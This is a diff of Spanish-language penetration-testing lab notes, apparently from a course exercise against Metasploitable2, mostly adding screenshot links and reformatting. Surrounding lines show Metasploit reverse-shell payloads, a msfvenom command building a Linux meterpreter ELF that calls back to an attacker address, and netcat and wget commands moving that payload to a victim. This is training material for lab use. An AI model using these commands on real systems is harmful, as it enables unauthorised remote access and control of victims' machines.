@@ -225,8 +225,7 @@ set payload windows/x64/meterpreter/reverse_tcp
 exploit
 
 # 6. Dejar sesión en background (segundo plano)
-background
-# o Ctrl+Z
+background # o Ctrl+Z
 
 # 7. Demostrar que la sesión está en background
 sessions
@@ -236,6 +235,9 @@ sessions -i <ID_SESION>
 ```
 
 ![](attachments/{AB45CCEF-8064-45F4-B8C4-3760816710CE}.png)
+![](attachments/{300F3526-8990-495E-B3F5-241DAD245F7F}.png)
+![](attachments/{4BEDD47D-F0B3-48BB-ADF7-0A978F81A7FC}.png)
+![](attachments/{E0730FE4-DBC3-41F4-9E3A-00E4141F3D16}.png)
 
 
 ## Ejercicio 6 — Backdoors
@@ -396,13 +398,7 @@ vncviewer <IP_VICTIMA>:5900
 # 1. Generar payload Linux reverse shell con MSFVenom
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f elf -o /tmp/payload.elf
 
-# 2. Transferir payload a la máquina víctima (Metasploitable2)
-#    Opción A: Servidor HTTP en Kali
-cd /tmp
-python3 -m http.server 8080
-#    En la víctima (desde otra shell obtenida previamente):
-wget http://<IP_ATACANTE>:8080/payload.elf -O /tmp/payload.elf
-
+# 2. Transferir payload a la máquina víctima, usaremos el VSFTPD anterior
 #    Opción B: Netcat
 #    En Kali:
 nc -lvp 4445 < /tmp/payload.elf
@@ -431,7 +427,8 @@ hostname
 cat /etc/*release
 ```
 
----
+![](attachments/{31B6ABFC-7C0C-48D0-B5D5-0F0212BA1B6B}.png)
+
 
 ## Referencias
 
